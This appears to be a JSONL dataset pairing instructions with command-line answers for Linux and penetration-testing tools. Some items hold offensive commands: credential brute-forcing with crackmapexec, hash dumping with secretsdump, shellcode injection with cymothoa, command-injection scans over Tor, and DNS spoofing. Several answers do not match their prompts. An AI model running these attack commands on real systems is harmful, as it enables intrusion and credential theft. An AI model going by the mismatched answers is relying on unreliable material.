{"input": "Enumerate public resources for the keyword \"org\" across all cloud platforms, using a brute-force list located at \"/custom/brute.txt\" and a custom DNS server at 1.1.1.1", "answer": "cloud_enum -k org -b /custom/brute.txt -ns 1.1.1.1"}
{"input": "Enumerate cloud resources for the domain \"example.com\" using the keyword \"dev\" and a wordlist located at \"/path/to/wordlist.txt\". Use 100 threads and save the output to \"results.txt\"", "answer": "cloudbrute -d example.com -k dev -w /path/to/wordlist.txt -t 100 -o results.txt"}
{"input": "Perform a cloud enumeration for the domain \"test.com\" with the keyword \"prod\", using a wordlist at \"/usr/share/wordlists/cloud.txt\". Force the search to target AWS and enable debug logs", "answer": "cloudbrute -d test.com -k prod -w /usr/share/wordlists/cloud.txt -c aws -D"}
{"input": "Enumerate cloud storage resources for the domain \"myapp.com\" using the keyword \"backup\" and a wordlist at \"/home/user/wordlist.txt\". Use a proxy list at \"/path/to/proxy.txt\" and randomize user agents", "answer": "cloudbrute -d myapp.com -k backup -w /home/user/wordlist.txt -p /path/to/proxy.txt -a"}
{"input": "Search for cloud applications for the domain \"company.com\" with the keyword \"app\", using a wordlist at \"/opt/wordlists/apps.txt\". Set the timeout to 15 seconds and suppress all output", "answer": "cloudbrute -d company.com -k app -w /opt/wordlists/apps.txt -T 15 -q"}
{"input": "Enumerate cloud resources for the domain \"example.org\" with the keyword \"test\", using a wordlist at \"/var/wordlists/cloud.txt\". Use a custom config folder at \"/etc/custom_config\" and save the output to \"output.txt\"", "answer": "cloudbrute -d example.org -k test -w /var/wordlists/cloud.txt -C /etc/custom_config -o output.txt"}
{"input": "Perform a cloud enumeration for the domain \"app.com\" with the keyword \"api\", using a wordlist at \"/home/user/wordlist.txt\". Set the mode to \"app\" and use 50 threads", "answer": "cloudbrute -d app.com -k api -w /home/user/wordlist.txt -m app -t 50"}
{"input": "Enumerate cloud storage resources for the domain \"data.com\" with the keyword \"files\", using a wordlist at \"/usr/share/wordlists/storage.txt\". Use a proxy list at \"/path/to/proxy.txt\" and set the timeout to 20 seconds", "answer": "cloudbrute -d data.com -k files -w /usr/share/wordlists/storage.txt -p /path/to/proxy.txt -T 20"}
{"input": "Search for cloud resources for the domain \"example.net\" with the keyword \"dev\", using a wordlist at \"/home/user/wordlist.txt\". Enable debug logs and save the output to \"debug_output.txt\"", "answer": "cloudbrute -d example.net -k dev -w /home/user/wordlist.txt -D -o debug_output.txt"}
{"input": "Scan multiple websites listed in a file called `targets.txt` using CMSeeK, ensuring that the tool skips any previously scanned sites", "answer": "python3 cmseek.py -l /home/user/targets.txt --skip-scanned"}
{"input": "Scan `example.com` using CMSeeK with verbose output to get detailed information about the scan process", "answer": "python3 cmseek.py -u example.com -v"}
{"input": "Scan multiple websites listed in `targets.txt` using CMSeeK in batch mode, so the tool doesn't prompt for user input after each site is scanned", "answer": "python3 cmseek.py -l /home/user/targets.txt --batch"}
{"input": "Run cntlm with NTLM authentication, create a PID file at `/var/run/cntlm.pid`, and set the main listening port to `3128`", "answer": "cntlm -a ntlm -P /var/run/cntlm.pid -l 3128"}
{"input": "Open a file named `notes.md` in code-oss and set the theme to Dark+", "answer": "code-oss notes.md"}
{"input": "Check the available options for the update-command-not-found tool", "answer": "update-command-not-found -h"}
{"input": "Test the parameter \"username\" on the target URL \"http://example.com/login\" for command injection vulnerabilities using Commix, and retrieve all possible system information", "answer": "commix -u http://example.com/login -p username --all"}
{"input": "Test the target URL \"http://example.com/login\" for command injection vulnerabilities using Commix, retrieve all system information, and use a time limit of 3600 seconds for the scan", "answer": "commix -u http://example.com/login --all --time-limit=3600"}
{"input": "Perform a command injection test on the target URL \"http://example.com/login\" using Commix, retrieve all system information, and use a predefined answer \"quit=N\" to avoid user interaction", "answer": "commix -u http://example.com/login --all --answers=\"quit=N\""}
{"input": "Test the target URL \"http://example.com/login\" for command injection vulnerabilities using Commix, retrieve all system information, and use the Tor network for anonymity", "answer": "commix -u http://example.com/login --all --tor"}
{"input": "Use the merge-router-config.pl tool to update the configuration of a router at 172.16.32.1 with a TFTP server at 172.16.32.100 and the SNMP community string \"admin\"", "answer": "merge-router-config.pl 172.16.32.1 172.16.32.100 admin"}
{"input": "Use the merge-router-config.pl tool to combine the configuration of a router at 198.51.100.1 with a TFTP server at 198.51.100.50 and the SNMP community string \"network\"", "answer": "merge-router-config.pl 198.51.100.1 198.51.100.50 network"}
{"input": "Use the merge-router-config.pl tool to update the configuration of a router at 10.1.1.1 with a TFTP server at 10.1.1.100 and the SNMP community string \"configmerge\"", "answer": "merge-router-config.pl 10.1.1.1 10.1.1.100 configmerge"}
{"input": "Generate a new key-pair for signing container images using cosign and save the private key to `private.key` and the public key to `public.key`", "answer": "cosign generate-key-pair --output-private-key=private.key --output-public-key=public.key"}
{"input": "Sign a blob file `data.txt` using cosign and output the signature to `data.sig`", "answer": "cosign sign-blob --output=data.sig data.txt"}
{"input": "Verify the signature of a blob file `data.txt` using the signature file `data.sig` and the public key `public.key`", "answer": "cosign verify-blob --signature=data.sig --key=public.key data.txt"}
{"input": "Display the supply chain security artifacts (such as signatures, SBOMs, and attestations) for the container image `example.com/myimage:latest`", "answer": "cosign tree example.com/myimage:latest"}
{"input": "Disable the Covenant-KBX tool from starting automatically on system boot", "answer": "systemctl disable covenant-kbx"}
{"input": "Reload the Covenant-KBX service to apply configuration changes without restarting", "answer": "systemctl reload covenant-kbx"}
{"input": "Decrypt the Bluetooth Low Energy traffic in `encrypted_data.pcap` using the LTK `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6` and save the decrypted output to `decrypted_data.pcap`", "answer": "crackle -i encrypted_data.pcap -l a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -o decrypted_data.pcap"}
{"input": "Crack the Bluetooth Low Energy encryption in `pairing.pcap`, save the decrypted output to `result.pcap`, and run tests against the crypto engine", "answer": "crackle -i pairing.pcap -o result.pcap -t"}
{"input": "Decrypt the Bluetooth Low Energy traffic in `traffic.pcap` using the LTK `1234567890abcdef1234567890abcdef` and enable verbose output", "answer": "crackle -i traffic.pcap -l 1234567890abcdef1234567890abcdef -v"}
{"input": "Decrypt the Bluetooth Low Energy traffic in `encrypted.pcap` using the LTK `fedcba0987654321fedcba0987654321` and save the decrypted output to `decrypted.pcap`", "answer": "crackle -i encrypted.pcap -l fedcba0987654321fedcba0987654321 -o decrypted.pcap"}
{"input": "Scan the SMB protocol on the IP range 192.168.1.0/24 with 50 threads and a timeout of 10 seconds per thread", "answer": "crackmapexec smb 192.168.1.0/24 -t 50 --timeout 10"}
{"input": "Test SSH credentials on the IP 172.16.32.12 using a username list `users.txt` and a password list `passwords.txt`", "answer": "crackmapexec ssh 172.16.32.12 -u users.txt -p passwords.txt"}
{"input": "Perform a WINRM scan on the IP range 10.0.0.1-10.0.0.254 with 100 threads and enable verbose output", "answer": "crackmapexec winrm 10.0.0.1-10.0.0.254 -t 100 --verbose"}
{"input": "Test FTP credentials on the IP 192.168.2.50 using the username `admin` and password `password123`", "answer": "crackmapexec ftp 192.168.2.50 -u admin -p password123"}
{"input": "Scan the MSSQL protocol on the IP 10.129.228.124 with a timeout of 15 seconds per thread", "answer": "crackmapexec mssql 10.129.228.124 --timeout 15"}
{"input": "Enumerate LDAP on the IP range 10.10.0.1-10.10.0.255 with 200 threads and verbose output", "answer": "crackmapexec ldap 10.10.0.1-10.10.0.255 -t 200 --verbose"}
{"input": "Test RDP credentials on the IP 192.168.5.10 using the username `user1` and password `Passw0rd!`", "answer": "crackmapexec rdp 192.168.5.10 -u user1 -p Passw0rd!"}
{"input": "Extract all cached credentials from the Windows registry hive file located at `/path/to/SYSTEM` and `/path/to/SECURITY`", "answer": "cachedump.py /path/to/SYSTEM /path/to/SECURITY"}
{"input": "Dump all password hashes from the Windows registry hive file located at `/path/to/SAM` using the system hive at `/path/to/SYSTEM`", "answer": "secretsdump.py -sam /path/to/SAM -system /path/to/SYSTEM LOCAL"}
{"input": "Extract all LSA secrets and cached credentials from the Windows registry hive files located at `/path/to/SYSTEM` and `/path/to/SECURITY`, and dump all local user account password hashes from `/path/to/SAM`", "answer": "impacket-secretsdump -system /path/to/SYSTEM -security /path/to/SECURITY -sam /path/to/SAM LOCAL"}
{"input": "Run only the tests labeled with \"performance\" and \"integration\" in the critest suite", "answer": "critest --ginkgo.label-filter=\"performance || integration\""}
{"input": "Run the critest suite with a custom runtime handler \"custom-handler\" and a timeout of 10 minutes for the runtime service", "answer": "critest --runtime-handler=\"custom-handler\" --runtime-service-timeout=10m"}
{"input": "Run the critest suite with a focus on tests matching the regular expression \"performance\" and generate a succinct report", "answer": "critest --ginkgo.focus=\"performance\" --ginkgo.succinct"}
{"input": "Create a wordlist with all possible combinations of lowercase letters and numbers from length 5 to 6, using the character set a-z and 0-9, and save it to a file named \"wordlist.txt\" while compressing it with gzip", "answer": "crunch 5 6 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt -z gzip"}
{"input": "Listen for incoming connections on port 9999 using cryptcat, with source routing through the gateway 10.0.0.1", "answer": "cryptcat -l -p 9999"}
{"input": "Start all encrypted disk mappings listed in `/etc/crypttab` using `cryptdisks_start`", "answer": "cryptdisks_start all"}
{"input": "Deactivate all encrypted disks on the system to prepare for a shutdown", "answer": "cryptdisks_stop --all"}
{"input": "Unmount and deactivate all encrypted devices configured in /etc/crypttab", "answer": "cryptdisks_stop --all"}
{"input": "Close the mapped LUKS2 encrypted volume `/dev/mapper/my_encrypted_volume`", "answer": "cryptsetup close my_encrypted_volume"}
{"input": "Check if the device `/dev/sdb1` contains a valid LUKS partition header", "answer": "cryptsetup isLuks /dev/sdb1"}
{"input": "Format the device `/dev/sdb1` with integrity using the CRC32C algorithm and enable bitmap mode to track changes", "answer": "integritysetup format --integrity=crc32c --integrity-bitmap-mode /dev/sdb1"}
{"input": "Open the integrity device `/dev/sdb1` and map it to `/dev/mapper/my_integrity_device` with a journal size of 16MB", "answer": "integritysetup open --journal-size=16777216 /dev/sdb1 my_integrity_device"}
{"input": "Dump the on-disk information for the integrity device `/dev/sdb1`", "answer": "integritysetup dump /dev/sdb1"}
{"input": "Format the device `/dev/sdc1` with integrity using the CRC32C algorithm, disable the journal, and allow discards (TRIM) requests", "answer": "integritysetup format --integrity=crc32c --integrity-no-journal --allow-discards /dev/sdc1"}
{"input": "Format the device `/dev/sde1` with integrity using the CRC32C algorithm, set the tag size to 16 bytes, and disable blkid signature detection", "answer": "integritysetup format --integrity=crc32c --tag-size=16 --disable-blkid /dev/sde1"}
{"input": "Close the dm-verity device named `secure_data` and remove its mapping", "answer": "veritysetup close secure_data"}
{"input": "Format a data device `/dev/sdb1` and a hash device `/dev/sdc1` using the SHA-512 hash algorithm, with a custom hash block size of 8192 bytes and a salt value of `x9y8z7w6`", "answer": "veritysetup format /dev/sdb1 /dev/sdc1 --hash=sha512 --hash-block-size=8192 --salt=x9y8z7w6"}
{"input": "Start cupid-hostapd with debug messages enabled, run it in the background, and specify the PID file as \"/var/run/hostapd_background.pid\"", "answer": "cupid-hostapd -d -B -P /var/run/hostapd_background.pid hostapd.conf"}
{"input": "Run cupid-hostapd with a control interface group set to \"network_admin\", include key data in debug messages, and specify the PID file as \"/var/run/hostapd_network.pid\"", "answer": "cupid-hostapd -G network_admin -K -P /var/run/hostapd_network.pid hostapd.conf"}
{"input": "Change the debug level of the hostapd instance to 3 for more detailed logging", "answer": "hostapd_cli level 3"}
{"input": "Enable the wireless network configuration with network ID 2", "answer": "wpa_cli enable_network 2"}
{"input": "Remove the wireless network configuration with network ID 3", "answer": "wpa_cli remove_network 3"}
{"input": "Force the WPA supplicant to reassociate with the current network", "answer": "wpa_cli reassociate"}
{"input": "Display the list of configured wireless networks", "answer": "wpa_cli list_networks"}
{"input": "Set the preferred BSSID for the network with ID 4 to \"00:11:22:33:44:55\"", "answer": "wpa_cli bssid 4 00:11:22:33:44:55"}
{"input": "Add the BSSID \"AA:BB:CC:DD:EE:FF\" to the blacklist", "answer": "wpa_cli blacklist_add AA:BB:CC:DD:EE:FF"}
{"input": "Clear the current blacklist of BSSIDs", "answer": "wpa_cli blacklist clear"}
{"input": "Start the `wpa_supplicant` in the background using the `nl80211` driver on the `wlan0` interface with the configuration file `/etc/wpa_supplicant.conf`", "answer": "wpa_supplicant -B -Dnl80211 -iwlan0 -c/etc/wpa_supplicant.conf"}
{"input": "Run `wpa_supplicant` with increased debugging verbosity, logging output to a file named `debug.log`, and using the `wext` driver on the `wlan1` interface with the configuration file `/etc/wpa_supplicant.conf`", "answer": "wpa_supplicant -dd -Dwext -iwlan1 -c/etc/wpa_supplicant.conf -fdebug.log"}
{"input": "Run `wpa_supplicant` with a custom PID file `/var/run/wpa_supplicant.pid`, logging output to syslog, and using the `nl80211` driver on the `wlan2` interface with the configuration file `/etc/wpa_supplicant.conf`", "answer": "wpa_supplicant -Dnl80211 -iwlan2 -c/etc/wpa_supplicant.conf -P/var/run/wpa_supplicant.pid -s"}
{"input": "Run `wpa_supplicant` with the `nl80211` driver on the `wlan7` interface, overriding the control interface parameter to `/var/run/wpa_supplicant_new`, and including keys in debug output", "answer": "wpa_supplicant -Dnl80211 -iwlan7 -c/etc/wpa_supplicant.conf -O/var/run/wpa_supplicant_new -K"}
{"input": "Download a file from a URL and save it with the same name as on the server", "answer": "curl -O https://example.com/file.zip"}
{"input": "Send a POST request with JSON data to a URL and include the response headers in the output", "answer": "curl -d '{\"key\":\"value\"}' -H \"Content-Type: application/json\" -i https://example.com/api"}
{"input": "Download a file from a URL and save it to a specific local file", "answer": "curl -o localfile.zip https://example.com/file.zip"}
{"input": "Fetch the headers of a URL without downloading the content", "answer": "curl -I https://example.com"}
{"input": "Upload a local file to a remote server using FTP", "answer": "curl -T myfile.txt ftp://example.com/upload/ --user username:password"}
{"input": "Send a GET request to a URL with a custom User-Agent header", "answer": "curl -A \"MyCustomUserAgent\" https://example.com"}
{"input": "Send a POST request with form data to a URL and save the response to a file", "answer": "curl -d \"param1=value1&param2=value2\" -o response.txt https://example.com/form"}
{"input": "Download a file from a URL and resume the download if it was interrupted", "answer": "curl -C - -O https://example.com/largefile.zip"}
{"input": "Send a request to a URL with a custom HTTP method (e.g., DELETE)", "answer": "curl -X DELETE https://example.com/resource/123"}
{"input": "Fetch the contents of a URL and include both the headers and the body in the output", "answer": "curl -i https://example.com"}
{"input": "Download a file from a URL and limit the download speed to 100 KB/s", "answer": "curl --limit-rate 100K -O https://example.com/largefile.zip"}
{"input": "Download a file from `https://example.com/file.zip` using wcurl, and pass multiple curl options like `--retry 3` and `--max-time 10` to retry the download up to 3 times and set a maximum time limit of 10 seconds", "answer": "wcurl --curl-options \"--retry 3\" --curl-options \"--max-time 10\" https://example.com/file.zip"}
{"input": "Display all available information about the libcurl installation, including compiler flags, library linking information, enabled features, and protocols", "answer": "curl-config --all"}
{"input": "Check if libcurl was built as a shared library", "answer": "curl-config --libs"}
{"input": "Show the version information of the installed libcurl", "answer": "curl --version"}
{"input": "Mount the FTP server at `ftp.example.net` to `/mnt/ftp` with kernel caching enabled, a file permission mask of `755`, and a maximum read size of 64KB", "answer": "curlftpfs -o kernel_cache,umask=755,max_read=65536 ftp.example.net /mnt/ftp"}
{"input": "Mount the FTP server at `ftp.example.com` to `/mnt/ftp` with direct I/O, asynchronous reads, and a custom filesystem name of `my_ftpfs`", "answer": "curlftpfs -o direct_io,async_read,fsname=my_ftpfs ftp.example.com /mnt/ftp"}
{"input": "Mount the FTP server at `ftp.example.net` to `/mnt/ftp` with a custom subdirectory prepended to all paths and relative symlinks enabled", "answer": "curlftpfs -o subdir=/custom/path,rellinks ftp.example.net /mnt/ftp"}
{"input": "Capture the webpage at \"https://example.net\" as a JPEG image, disabling JavaScript execution during the capture", "answer": "cutycapt --url=https://example.net --out=output.jpg --javascript=off"}
{"input": "Save the webpage at \"https://example.com\" as an SVG file, using a custom User-Agent string \"MyCustomAgent/1.0\"", "answer": "cutycapt --url=https://example.com --out=output.svg --user-agent=\"MyCustomAgent/1.0\""}
{"input": "Capture the webpage at \"https://example.com\" as a BMP image, setting a delay of 5 seconds after the page loads before capturing", "answer": "cutycapt --url=https://example.com --out=output.bmp --delay=5000"}
{"input": "Capture the webpage at \"https://example.net\" as a PNG image, setting a custom CSS style rule to hide all images on the page", "answer": "cutycapt --url=https://example.net --out=output.png --user-style-string=\"img { display: none; }\""}
{"input": "Search for all occurrences of the string \"HelloWorld\" in the binary file \"executable.exe\"", "answer": "bgrep -a 48656C6C6F576F726C64 executable.exe"}
{"input": "Inject shellcode number 4 into the process with PID 1122, using the alarm scheduler, and set the timer to 10 seconds", "answer": "cymothoa -p 1122 -s 4 -a -j 10"}
{"input": "Start darkstat to capture network traffic on interface eth0, bind to port 8080, and log only local traffic without resolving DNS names", "answer": "darkstat -i eth0 -p 8080 --local-only --no-dns"}
{"input": "Run darkstat on interface eth0, set the maximum number of ports to track to 50, and disable promiscuous mode", "answer": "darkstat -i eth0 --ports-max 50 --no-promisc"}
{"input": "Start darkstat on interface eth2, chroot to `/var/darkstat`, and run as the user `darkstat_user`", "answer": "darkstat -i eth2 --chroot /var/darkstat --user darkstat_user"}
{"input": "Test a WebDAV server at `http://testserver.com/dav` with debug level 2 to log requests and responses, and use a custom random string `test123` for filenames", "answer": "davtest -url http://testserver.com/dav -debug 2 -rand test123"}
{"input": "Open a connection to a PostgreSQL database named \"mydb\" on host \"localhost\" with the username \"admin\" and password \"password123\"", "answer": "psql -h localhost -d mydb -U admin -W"}
{"input": "Skip the first 100 sectors of the input device `/dev/sde` and write the remaining data to `/mnt/backup/image.img`, while logging the operation to `/mnt/backup/log.txt`", "answer": "dc3dd if=/dev/sde iskip=100 of=/mnt/backup/image.img log=/mnt/backup/log.txt"}
{"input": "Read data from the input file `/mnt/backup/image.img` and write it to the device `/dev/sdh`, while computing an MD5 hash of the input and output for verification", "answer": "dc3dd if=/mnt/backup/image.img of=/dev/sdh hash=md5 log=/mnt/backup/log.txt"}
{"input": "Create a forensic image of the device `/dev/sdb` and save it to `image.img` while calculating the SHA256 hash of the entire image", "answer": "dcfldd if=/dev/sdb of=image.img hash=sha256 hashlog=image.sha256"}
{"input": "Create a forensic image of `/dev/sdg` and calculate the MD5 hash of every 512-byte block, logging the results to `md5_hashes.log`", "answer": "dcfldd if=/dev/sdg of=image.img hash=md5 hashwindow=512 hashlog=md5_hashes.log"}
{"input": "Copy data from `/dev/sdh` to `output.img` but only write to the output if the destination block content differs", "answer": "dcfldd if=/dev/sdh of=output.img diffwr=on"}
{"input": "Copy data from `/dev/sdj` to `output.img` and display the total hash value in a custom format", "answer": "dcfldd if=/dev/sdj of=output.img hash=sha256 totalhashformat=\"Total Hash: %H\""}
{"input": "Create a forensic image of `/dev/sdk` and perform the hashing operation after all data conversions", "answer": "dcfldd if=/dev/sdk of=image.img hash=sha256 hashconv=after"}
{"input": "Recover data from a failing hard drive `/dev/sdc` to a file `recovery.img`, starting at position 1GB and using a block size of 512KB", "answer": "dd_rescue -s 1G -b 512k /dev/sdc recovery.img"}
{"input": "Deobfuscate `file5.exe` and use a delegate to call the real string decrypter", "answer": "de4dot.exe -f file5.exe --strtyp delegate"}
{"input": "Sign the APK file \"app-release.apk\" using the tiny sign method and save the signed APK as \"tiny-signed.apk\" in the current directory", "answer": "d2j-apk-sign -t -o tiny-signed.apk app-release.apk"}
{"input": "Sign the APK file \"app-release.apk\" using the tiny sign method and overwrite the output file if it exists, saving it as \"tiny-overwrite.apk\"", "answer": "d2j-apk-sign -f -t -o tiny-overwrite.apk app-release.apk"}
{"input": "Disassemble the dex file `example.dex` and save the output .smali files to a directory named `example-out`, while also using the `.locals` directive and ensuring the output directory is overwritten if it already exists", "answer": "d2j-baksmali -f -l -o example-out example.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using the configuration file `config.xml` and output the modified file as `modified_app.dex`", "answer": "d2j-dex-weaver -c config.xml -o modified_app.dex app.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using the stub dex file `stub.dex` and save the output as `weaved_app.dex`", "answer": "d2j-dex-weaver -s stub.dex -o weaved_app.dex app.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using both the configuration file `config.xml` and the stub dex file `stub.dex`, and save the output as `final_app.dex`", "answer": "d2j-dex-weaver -c config.xml -s stub.dex -o final_app.dex app.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using the configuration file `config.xml` and save the output with the default name", "answer": "d2j-dex-weaver -c config.xml app.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using both the configuration file `config.xml` and the stub dex file `stub.dex`, and save the output with the default name", "answer": "d2j-dex-weaver -c config.xml -s stub.dex app.dex"}
{"input": "Replace invoke instructions in the `app.dex` file using the configuration file `config.xml`, the stub dex file `stub.dex`, and save the output as `final_output.dex`", "answer": "d2j-dex-weaver -c config.xml -s stub.dex -o final_output.dex app.dex"}
{"input": "Convert the file `app.dex` to a JAR file, skipping any exceptions that might occur during the conversion process", "answer": "d2j-dex2jar --skip-exceptions app.dex"}
{"input": "Convert the file `app.dex` to a JAR file, optimizing synchronized blocks for better performance", "answer": "d2j-dex2jar --optimize-synchronized app.dex"}
{"input": "Convert the file `app.dex` to a JAR file, sorting blocks topologically to generate more readable code", "answer": "d2j-dex2jar --topological-sort app.dex"}
{"input": "Convert the file `app.dex` to a JAR file, but do not handle any exceptions that might be thrown during the conversion process", "answer": "d2j-dex2jar --not-handle-exception app.dex"}
{"input": "Convert the file `app.dex` to a JAR file, reusing registers while generating the Java `.class` file", "answer": "d2j-dex2jar --reuse-reg app.dex"}
{"input": "Disassemble the dex file `app.dex` and output the smali files to the default directory while avoiding the use of parameter register syntax (`p<n>`)", "answer": "d2j-dex2smali app.dex"}
{"input": "Disassemble the dex file `test.dex` and output the smali files to a custom directory named `smali_files` without including debug information", "answer": "d2j-dex2smali -b -o smali_files test.dex"}
{"input": "Replace invocations in a JAR file named `input.jar` using a configuration file `config.xml` and save the output as `output.jar`", "answer": "d2j-jar-weaver -c config.xml -o output.jar input.jar"}
{"input": "Replace invocations in a JAR file `app.jar` using a stub JAR `stub.jar` and save the modified JAR as `modified-app.jar`", "answer": "d2j-jar-weaver -s stub.jar -o modified-app.jar app.jar"}
{"input": "Replace invocations in a JAR file `example.jar` using both a configuration file `settings.xml` and a stub JAR `stub.jar`, and save the output as `final.jar`", "answer": "d2j-jar-weaver -c settings.xml -s stub.jar -o final.jar example.jar"}
{"input": "Replace invocations in a JAR file `library.jar` using a stub JAR `library-stub.jar` and save the output as `library-modified.jar`", "answer": "d2j-jar-weaver -s library-stub.jar -o library-modified.jar library.jar"}
{"input": "Replace invocations in a JAR file `project.jar` using a configuration file `project-config.xml` and save the output as `project-output.jar`", "answer": "d2j-jar-weaver -c project-config.xml -o project-output.jar project.jar"}
{"input": "Replace invocations in a JAR file `sample.jar` using both a configuration file `sample-config.xml` and a stub JAR `sample-stub.jar`, and save the output as `sample-final.jar`", "answer": "d2j-jar-weaver -c sample-config.xml -s sample-stub.jar -o sample-final.jar sample.jar"}
{"input": "Replace invocations in a JAR file `application.jar` using a stub JAR `application-stub.jar` and save the output as `application-modified.jar`", "answer": "d2j-jar-weaver -s application-stub.jar -o application-modified.jar application.jar"}
{"input": "Forcefully disassemble all classes in `test.jar` to Jasmin files, overwriting any existing files, and save the output in a custom directory `jasmin-output`", "answer": "d2j-jar2jasmin -f -o jasmin-output test.jar"}
{"input": "Disassemble all classes in `data.jar` to Jasmin files, including debug information, force overwrite any existing files, and save the output in a custom directory `jasmin-data`", "answer": "d2j-jar2jasmin -d -f -o jasmin-data data.jar"}
{"input": "Convert `.j` files into a `.jar` file named `final.jar`, forcing overwrite, autogenerating line numbers, and setting the class version to Java 7", "answer": "d2j-jasmin2jar -f -g --class-version 7 -o final.jar *.j"}
{"input": "Assemble smali files from the \"smali_files\" folder into a dex file, and read additional smali code from standard input while allowing odex instructions", "answer": "d2j-smali -x -o combined.dex smali_files -"}
{"input": "Standardize the APK file \"test.apk\" and save the cleaned version as \"test_output.zip\"", "answer": "d2j-std-apk -o test_output.zip test.apk"}
{"input": "Standardize the APK file \"application.apk\" and save the output as \"application_cleaned.zip\" in the \"outputs\" directory", "answer": "d2j-std-apk -o outputs/application_cleaned.zip application.apk"}
{"input": "Execute a Java class `MainClass` with the `-X` flag to print help on extra options to the error stream", "answer": "java -X"}
{"input": "Scan \"http://example.com\" with case-insensitive search and ignore responses with HTTP code 404", "answer": "dirb http://example.com -i -N 404"}
{"input": "Scan the target URL `http://example.com` with a custom wordlist `custom_wordlist.txt` and include only `.php` and `.html` extensions", "answer": "dirsearch -u http://example.com -w custom_wordlist.txt -e php,html"}
{"input": "Scan the target URL `http://example.com` with 50 threads, include only status codes 200 and 302, and save the output to `scan_results.txt`", "answer": "dirsearch -u http://example.com -t 50 -i 200,302 -o scan_results.txt"}
{"input": "Scan the target URL `http://example.com` using a proxy server `http://proxy.example.com:8080` and save the log to `scan_log.txt`", "answer": "dirsearch -u http://example.com --proxy http://proxy.example.com:8080 --log scan_log.txt"}
{"input": "Scan the target URL `http://example.com` with a random User-Agent for each request and exclude responses with a size of 0 bytes", "answer": "dirsearch -u http://example.com --random-agent --exclude-sizes 0B"}
{"input": "Use dislocker-bek to inspect the .BEK file stored in the current directory as `backup_key.bek`", "answer": "dislocker-bek -f ./backup_key.bek"}
{"input": "Start the dns2tcpd server in the foreground, listening on IP address 192.168.1.100, with a debug level of 3, using the configuration file `/etc/dns2tcpd.conf`, and save the process ID to `/var/run/dns2tcpd.pid`", "answer": "dns2tcpd -i 192.168.1.100 -F -d 3 -f /etc/dns2tcpd.conf -p /var/run/dns2tcpd.pid"}
{"input": "Run the dns2tcpd server in the foreground with a debug level of 1, using the default configuration file, and bind it to the localhost IP address 127.0.0.1", "answer": "dns2tcpd -i 127.0.0.1 -F -d 1"}
{"input": "Run the dns2tcpd server in the foreground with a debug level of 0, using a custom configuration file located at `/home/user/custom.conf`", "answer": "dns2tcpd -F -d 0 -f /home/user/custom.conf"}
{"input": "Run the dns2tcpd server in the foreground, listening on all available interfaces, with a debug level of 5, and use the default configuration file", "answer": "dns2tcpd -F -d 5 -a 0.0.0.0 -c /etc/dns2tcpd.conf"}
{"input": "Run the dns2tcpd server in the foreground, listening on IP address 10.10.10.10, with a debug level of 2, and use a custom configuration file located at `/etc/dns2tcpd/custom_config.conf`", "answer": "dns2tcpd -i 10.10.10.10 -F -d 2 -f /etc/dns2tcpd/custom_config.conf"}
{"input": "Start the dnscat2 server and redirect all output to stdout instead of creating separate windows", "answer": "ruby dnscat2.rb --firehose"}
{"input": "Run DNSChef to spoof all DNS queries to resolve to the IP address 192.0.2.1, log all activity to a file named dnschef.log, and listen on the interface 192.168.1.100", "answer": "dnschef --fakeip 192.0.2.1 --logfile dnschef.log -i 192.168.1.100"}
{"input": "Use DNSChef to spoof DNS queries for the domains example.com and test.com to resolve to the IPv6 address 2001:db8::1, and use TCP for DNS proxying", "answer": "dnschef --fakedomains example.com,test.com --fakeipv6 2001:db8::1 -t"}
{"input": "Use DNSChef to spoof DNS queries based on a file containing domain-IP pairs, and log all activity to a file named spoof.log", "answer": "dnschef --file domain_ip_pairs.txt --logfile spoof.log"}
{"input": "Perform a DNSSEC zone walk on the domain \"example.com\" using dnsrecon", "answer": "dnsrecon -d example.com -t zonewalk"}
{"input": "Save the results of a standard DNS enumeration on the domain \"example.com\" to a JSON file named \"output.json\" using dnsrecon", "answer": "dnsrecon -d example.com -t std -j output.json"}
{"input": "Perform a standard DNS enumeration on the domain \"example.com\" using TCP protocol and save the results to an XML file named \"output.xml\" using dnsrecon", "answer": "dnsrecon -d example.com -t std --tcp -x output.xml"}
{"input": "Perform a standard DNS enumeration on the domain \"example.com\" with verbose output and save the results to a SQLite database named \"output.db\" using dnsrecon", "answer": "dnsrecon -d example.com -t std -v --db output.db"}
{"input": "Trace the DNS resolution chain for \"example.org\" using the initial DNS server 8.8.8.8, allow up to 5 retries per request, and limit the timeout to 2 seconds per try", "answer": "dnstracer -s 8.8.8.8 -r 5 -t 2 example.org"}
{"input": "Trace the DNS resolution chain for \"example.net\" using the query type \"MX\" and enable an overview of received answers", "answer": "dnstracer -q MX example.net"}
{"input": "Trace the DNS resolution chain for \"example.edu\" using the source IP address 192.168.1.100 and disable IPv6 queries", "answer": "dnstracer -S 192.168.1.100 -4 example.edu"}
{"input": "Trace the DNS resolution chain for \"example.org\" starting from the root server A.ROOT-SERVERS.NET, enable verbose output, and allow up to 10 retries per request", "answer": "dnstracer -v -r 10 -s A.ROOT-SERVERS.NET example.org"}
{"input": "Trace the DNS resolution chain for \"example.net\" using the initial DNS server 1.1.1.1, limit the timeout to 1 second per try, and disable IPv6 queries", "answer": "dnstracer -s 1.1.1.1 -t 1 -4 example.net"}
{"input": "Generate domain permutations for \"example.com\", evaluate web page similarity using the TLSH algorithm, and save screenshots to the \"screenshots\" directory", "answer": "dnstwist --lsh tlsh --screenshots screenshots example.com"}
{"input": "Scan \"example.com\" for domain permutations, use custom DNS servers \"8.8.8.8\" and \"1.1.1.1\", and set the User-Agent to \"MyCustomAgent\"", "answer": "dnstwist --nameservers 8.8.8.8,1.1.1.1 --useragent MyCustomAgent example.com"}
{"input": "Debug the DNS zone for \"finaldomain.net\" using dnswalk, enabling all checks and checking for missing reverse DNS entries", "answer": "dnswalk -a -r finaldomain.net"}
{"input": "Debug the DNS records for \"checkdomain.com\" using dnswalk, enabling all checks and forcing a full zone transfer", "answer": "dnswalk -a -F checkdomain.com."}
{"input": "Resolve a list of subdomains from the file \"subdomains.txt\" and display only the DNS responses", "answer": "dnsx -l subdomains.txt -ro"}
